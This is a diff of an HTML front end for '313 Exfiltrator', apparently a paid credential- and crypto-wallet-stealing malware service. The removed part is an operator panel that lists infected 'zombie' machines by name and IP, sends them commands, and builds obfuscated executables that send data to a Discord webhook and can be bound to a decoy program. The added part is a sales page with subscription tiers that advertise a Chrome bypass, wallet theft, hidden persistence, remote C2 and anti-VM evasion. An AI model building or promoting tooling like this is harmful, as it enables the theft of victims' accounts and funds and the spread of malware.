@@ -1,286 +1,107 @@
 <!DOCTYPE html>
-<html lang="en" class="dark">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>313 // COMMAND CENTER</title>
+    <title>313 EXFILTRATOR // Advanced Auditor</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --accent: #ffffff;
-            --bg: #000000;
-            --border: #1a1a1a;
-            --card: #0a0a0a;
-        }
-        body { background-color: var(--bg); color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; cursor: crosshair; }
+        body { background: #000; color: #fff; font-family: 'Inter', sans-serif; cursor: crosshair; }
         .mono { font-family: 'JetBrains Mono', monospace; }
-
-        /* Grade Interativa */
-        .grid-bg {
+        .grid-bg { 
             background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
-            background-size: 40px 40px;
+            background-size: 50px 50px;
         }
-
-        /* Efeito Spotlight */
         #spotlight {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none;
-            background: radial-gradient(circle 200px at var(--x) var(--y), rgba(255,255,255,0.06), transparent 80%);
+            background: radial-gradient(circle 200px at var(--x) var(--y), rgba(255,255,255,0.05), transparent 80%);
             z-index: 9999;
         }
-
-        .noir-card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .noir-card:hover { border-color: var(--accent); box-shadow: 0 0 20px rgba(255, 255, 255, 0.03); }
-
-        .sidebar-item { border-left: 2px solid transparent; transition: all 0.3s ease; }
-        .sidebar-item.active { background: rgba(255,255,255,0.03); border-left-color: #fff; color: #fff; }
-
-        .terminal {
-            background: #050505;
-            border: 1px solid #111;
-            height: 200px;
-            overflow-y: auto;
-        }
-        .terminal::-webkit-scrollbar { width: 3px; }
-        .terminal::-webkit-scrollbar-thumb { background: #222; }
-
-        .input-noir {
-            background: #000;
-            border: 1px solid var(--border);
-            color: #fff;
-            transition: border-color 0.3s ease;
-        }
-        .input-noir:focus { border-color: #fff; outline: none; }
-
-        @keyframes pulse-white {
-            0% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(255, 255, 255, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
-        }
-        .status-online { width: 8px; height: 8px; background: #fff; border-radius: 50%; animation: pulse-white 2s infinite; }
+        .noir-border { border: 1px solid #1a1a1a; }
+        .btn-white { background: #fff; color: #000; transition: all 0.3s ease; font-weight: 800; }
+        .btn-white:hover { background: #ccc; transform: translateY(-2px); box-shadow: 0 0 15px rgba(255,255,255,0.2); }
+        .pricing-card { background: #050505; transition: all 0.3s ease; }
+        .pricing-card:hover { border-color: #fff; }
     </style>
 </head>
 <body class="grid-bg min-h-screen">
     <div id="spotlight"></div>
 
-    <div class="flex h-screen overflow-hidden">
-        <!-- SIDEBAR -->
-        <aside class="w-64 border-r border-zinc-900 bg-black/50 backdrop-blur-xl flex flex-col z-50">
-            <div class="p-8 flex items-center space-x-3">
-                <div class="w-8 h-8 border border-white flex items-center justify-center font-bold mono text-sm">313</div>
-                <span class="mono text-xs tracking-[0.3em] font-bold">OVERLORD</span>
+    <nav class="flex justify-between items-center px-12 py-8 relative z-50">
+        <div class="flex items-center space-x-2">
+            <div class="w-8 h-8 border border-white flex items-center justify-center font-bold mono">313</div>
+            <span class="mono text-xs tracking-tighter">EXFILTRATOR</span>
+        </div>
+        <div class="space-x-8 mono text-[10px] tracking-widest uppercase">
+            <a href="#features" class="hover:text-gray-400">Features</a>
+            <a href="#pricing" class="hover:text-gray-400">Pricing</a>
+            <a href="/login" class="px-4 py-2 border border-white hover:bg-white hover:text-black transition">Terminal Login</a>
+        </div>
+    </nav>
+
+    <header class="flex flex-col items-center justify-center text-center pt-24 pb-20 relative z-10">
+        <h1 class="text-[10rem] font-extrabold leading-none tracking-tighter mono">313</h1>
+        <p class="text-zinc-500 mono text-sm tracking-[0.6em] mb-12 uppercase">Advanced Cryptographic Exfiltration</p>
+        <a href="/login" class="btn-white px-12 py-5 text-xs tracking-[0.4em]">LAUNCH SYSTEM</a>
+    </header>
+
+    <section id="pricing" class="max-w-6xl mx-auto py-24 px-6 relative z-10">
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+            <!-- Weekly -->
+            <div class="pricing-card noir-border p-8 rounded-sm">
+                <p class="mono text-[10px] text-zinc-600 mb-4 uppercase">Weekly Pass</p>
+                <h3 class="text-2xl font-bold mb-6">15€ <span class="text-xs text-zinc-700">/ $18</span></h3>
+                <ul class="text-[10px] mono text-zinc-500 space-y-2 mb-8">
+                    <li>+ Chrome v137+ Bypass</li>
+                    <li>+ All Wallets Enabled</li>
+                    <li>+ 24/7 Support</li>
+                </ul>
+                <button class="w-full py-3 border border-zinc-800 hover:border-white transition mono text-[10px]">PURCHASE</button>
             </div>
-
-            <nav class="flex-1 px-4 space-y-2 mt-4">
-                <button onclick="switchTab('nodes')" id="btn-nodes" class="w-full sidebar-item active flex items-center space-x-4 p-4 text-zinc-500 hover:text-white">
-                    <i data-lucide="layout-grid" class="w-4 h-4"></i>
-                    <span class="mono text-[10px] uppercase tracking-widest font-bold">Infected Nodes</span>
-                </button>
-                <button onclick="switchTab('builder')" id="btn-builder" class="w-full sidebar-item flex items-center space-x-4 p-4 text-zinc-500 hover:text-white">
-                    <i data-lucide="cpu" class="w-4 h-4"></i>
-                    <span class="mono text-[10px] uppercase tracking-widest font-bold">Stub Builder</span>
-                </button>
-                <button onclick="switchTab('logs')" id="btn-logs" class="w-full sidebar-item flex items-center space-x-4 p-4 text-zinc-500 hover:text-white">
-                    <i data-lucide="database" class="w-4 h-4"></i>
-                    <span class="mono text-[10px] uppercase tracking-widest font-bold">Database</span>
-                </button>
-            </nav>
-
-            <div class="p-8 border-t border-zinc-900">
-                <a href="/logout" class="flex items-center space-x-4 text-zinc-600 hover:text-white transition">
-                    <i data-lucide="log-out" class="w-4 h-4"></i>
-                    <span class="mono text-[10px] uppercase">Disconnect</span>
-                </a>
+            <!-- Monthly -->
+            <div class="pricing-card border border-white p-8 rounded-sm scale-105">
+                <p class="mono text-[10px] text-white mb-4 uppercase">Monthly Access</p>
+                <h3 class="text-2xl font-bold mb-6">50€ <span class="text-xs text-zinc-700">/ $55</span></h3>
+                <ul class="text-[10px] mono text-zinc-400 space-y-2 mb-8">
+                    <li>+ Remote C2 Command</li>
+                    <li>+ Hidden Persistence</li>
+                    <li>+ Daily Updates</li>
+                </ul>
+                <button class="w-full py-3 btn-white mono text-[10px]">PURCHASE</button>
             </div>
-        </aside>
-
-        <!-- MAIN CONTENT -->
-        <main class="flex-1 overflow-y-auto p-12 relative z-10">
-            
-            <!-- TELA: NODES (C2) -->
-            <div id="tab-nodes" class="tab-content animate-in fade-in duration-500">
-                <div class="flex justify-between items-end mb-12">
-                    <div>
-                        <h1 class="mono text-4xl font-bold tracking-tighter uppercase italic">Active Nodes_</h1>
-                        <p class="text-zinc-500 text-xs mt-2 mono uppercase tracking-widest">Real-time Command & Control interface</p>
-                    </div>
-                    <div class="flex space-x-8">
-                        <div class="text-right">
-                            <p class="text-[10px] text-zinc-600 uppercase mono">Total Zombies</p>
-                            <p class="text-2xl mono font-bold" id="total-nodes">0</p>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="noir-card overflow-hidden">
-                    <table class="w-full text-left border-collapse">
-                        <thead>
-                            <tr class="border-b border-zinc-900 text-[10px] uppercase mono text-zinc-500 bg-white/5">
-                                <th class="p-6">Status</th>
-                                <th class="p-6">Identifier</th>
-                                <th class="p-6">IP Address</th>
-                                <th class="p-6">OS Version</th>
-                                <th class="p-6">Last Seen</th>
-                                <th class="p-6 text-right">Actions</th>
-                            </tr>
-                        </thead>
-                        <tbody id="nodes-table" class="mono text-xs">
-                            <!-- Injetado via JS -->
-                        </tbody>
-                    </table>
-                </div>
+            <!-- Quarterly -->
+            <div class="pricing-card noir-border p-8 rounded-sm">
+                <p class="mono text-[10px] text-zinc-600 mb-4 uppercase">Quarterly</p>
+                <h3 class="text-2xl font-bold mb-6">120€ <span class="text-xs text-zinc-700">/ $130</span></h3>
+                <ul class="text-[10px] mono text-zinc-500 space-y-2 mb-8">
+                    <li>+ Priority Builds</li>
+                    <li>+ Private Stub Overlay</li>
+                    <li>+ Advanced Anti-VM</li>
+                </ul>
+                <button class="w-full py-3 border border-zinc-800 hover:border-white transition mono text-[10px]">PURCHASE</button>
             </div>
-
-            <!-- TELA: BUILDER -->
-            <div id="tab-builder" class="tab-content hidden animate-in fade-in duration-500">
-                <h1 class="mono text-4xl font-bold tracking-tighter uppercase italic mb-12">Engine Core_</h1>
-                
-                <div class="grid grid-cols-1 lg:grid-cols-12 gap-12">
-                    <div class="lg:col-span-7 space-y-8">
-                        <div class="noir-card p-10 space-y-6">
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                                <div>
-                                    <label class="block mono text-[10px] text-zinc-600 uppercase mb-2">Webhook Destination</label>
-                                    <input type="text" id="webhook" placeholder="https://discord.com/..." class="w-full input-noir p-4 rounded-sm text-xs mono">
-                                </div>
-                                <div>
-                                    <label class="block mono text-[10px] text-zinc-600 uppercase mb-2">License Expiry (Days)</label>
-                                    <input type="number" id="expiry" value="7" class="w-full input-noir p-4 rounded-sm text-xs mono">
-                                </div>
-                            </div>
-
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                                <div>
-                                    <label class="block mono text-[10px] text-zinc-600 uppercase mb-2">Custom Icon (.ico)</label>
-                                    <input type="file" id="icon" accept=".ico" class="w-full text-[10px] text-zinc-500 file:mr-4 file:py-2 file:px-4 file:border-0 file:bg-zinc-900 file:text-white hover:file:bg-zinc-800">
-                                </div>
-                                <div>
-                                    <label class="block mono text-[10px] text-zinc-600 uppercase mb-2">Decoy / Binder (.exe)</label>
-                                    <input type="file" id="decoy" accept=".exe" class="w-full text-[10px] text-zinc-500 file:mr-4 file:py-2 file:px-4 file:border-0 file:bg-zinc-900 file:text-white hover:file:bg-zinc-800">
-                                </div>
-                            </div>
-
-                            <button onclick="startBuild()" class="w-full bg-white text-black font-bold py-5 mt-6 text-xs uppercase tracking-[0.4em] hover:bg-zinc-300 transition-all shadow-[0_0_20px_rgba(255,255,255,0.1)]">
-                                Initialize Build
-                            </button>
-                        </div>
-                    </div>
-
-                    <div class="lg:col-span-5">
-                        <div class="noir-card p-8 h-full flex flex-col">
-                            <h3 class="mono text-xs font-bold uppercase mb-4 text-zinc-500 flex items-center">
-                                <i data-lucide="terminal" class="w-4 h-4 mr-2"></i> Output Stream
-                            </h3>
-                            <div id="terminal" class="terminal p-4 flex-1">
-                                <div id="terminal-content" class="mono text-[10px] text-zinc-500 space-y-1">
-                                    <p>> System ready for instruction...</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+            <!-- Lifetime -->
+            <div class="pricing-card noir-border p-8 rounded-sm">
+                <p class="mono text-[10px] text-zinc-600 mb-4 uppercase">Lifetime</p>
+                <h3 class="text-2xl font-bold mb-6">350€ <span class="text-xs text-zinc-700">/ $400</span></h3>
+                <ul class="text-[10px] mono text-zinc-500 space-y-2 mb-8">
+                    <li>+ Eternal Access</li>
+                    <li>+ Master Node Control</li>
+                    <li>+ Custom Request Feature</li>
+                </ul>
+                <button class="w-full py-3 border border-zinc-800 hover:border-white transition mono text-[10px]">PURCHASE</button>
             </div>
-
-        </main>
-    </div>
+        </div>
+    </section>
 
     <script>
         lucide.createIcons();
-
-        // Spotlight
         document.addEventListener('mousemove', (e) => {
             document.documentElement.style.setProperty('--x', e.clientX + 'px');
             document.documentElement.style.setProperty('--y', e.clientY + 'px');
         });
-
-        // Troca de Tabs
-        function switchTab(tabId) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hidden'));
-            document.querySelectorAll('.sidebar-item').forEach(b => b.classList.remove('active'));
-            document.getElementById('tab-' + tabId).classList.remove('hidden');
-            document.getElementById('btn-' + tabId).classList.add('active');
-            if (tabId === 'nodes') loadNodes();
-        }
-
-        // C2: Carregar PCs do Banco de Dados
-        async function loadNodes() {
-            const res = await fetch('/api/nodes');
-            const nodes = await res.json();
-            document.getElementById('total-nodes').innerText = nodes.length;
-            const table = document.getElementById('nodes-table');
-            table.innerHTML = nodes.map(n => `
-                <tr class="border-b border-zinc-900 hover:bg-white/5 transition-colors">
-                    <td class="p-6"><div class="status-online"></div></td>
-                    <td class="p-6 text-white font-bold">${n.pc_name}</td>
-                    <td class="p-6 text-zinc-400">${n.ip_address}</td>
-                    <td class="p-6 text-zinc-600">${n.os_info}</td>
-                    <td class="p-6 text-zinc-500">${new Date(n.last_ping).toLocaleString()}</td>
-                    <td class="p-6 text-right">
-                        <button onclick="sendCommand('${n.pc_name}')" class="px-4 py-2 border border-zinc-800 text-[10px] hover:border-white transition uppercase tracking-widest">Refresh</button>
-                    </td>
-                </tr>
-            `).join('');
-        }
-
-        async function sendCommand(pc_name) {
-            await fetch('/api/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ pc_name })
-            });
-            alert("Command Sent: FORCE_LOG");
-        }
-
-        // Builder Logic
-        async function startBuild() {
-            const webhook = document.getElementById('webhook').value;
-            const expiry = document.getElementById('expiry').value;
-            const terminal = document.getElementById('terminal-content');
-            
-            const addLog = (text) => {
-                const p = document.createElement('p');
-                p.innerText = `> ${text}`;
-                terminal.appendChild(p);
-                document.getElementById('terminal').scrollTop = 9999;
-            };
-
-            terminal.innerHTML = "";
-            addLog("INITIALIZING 313 COMPILER...");
-            await new Promise(r => setTimeout(r, 600));
-            addLog("FETCHING CLOUD ASSETS...");
-            addLog("APPLYING OBFUSCATION LAYER...");
-            await new Promise(r => setTimeout(r, 800));
-            addLog("INJECTING WEBHOOK OVERLAY...");
-            addLog("INJECTING EXPIRY TIMESTAMP...");
-
-            const formData = new FormData();
-            formData.append('webhook', webhook);
-            formData.append('expiry_days', expiry);
-            if(document.getElementById('icon').files[0]) formData.append('icon', document.getElementById('icon').files[0]);
-            if(document.getElementById('decoy').files[0]) formData.append('decoy', document.getElementById('decoy').files[0]);
-
-            const res = await fetch('/build', { method: 'POST', body: formData });
-            if (res.ok) {
-                addLog("[SUCCESS] BINARY RECONSTRUCTED.");
-                const blob = await res.blob();
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `313_Exfiltrator.exe`;
-                a.click();
-            } else {
-                addLog("[ERROR] FAILED TO COMPILE.");
-            }
-        }
-
-        // Auto Refresh Nodes
-        setInterval(loadNodes, 10000);
-        loadNodes();
     </script>
 </body>
 </html>
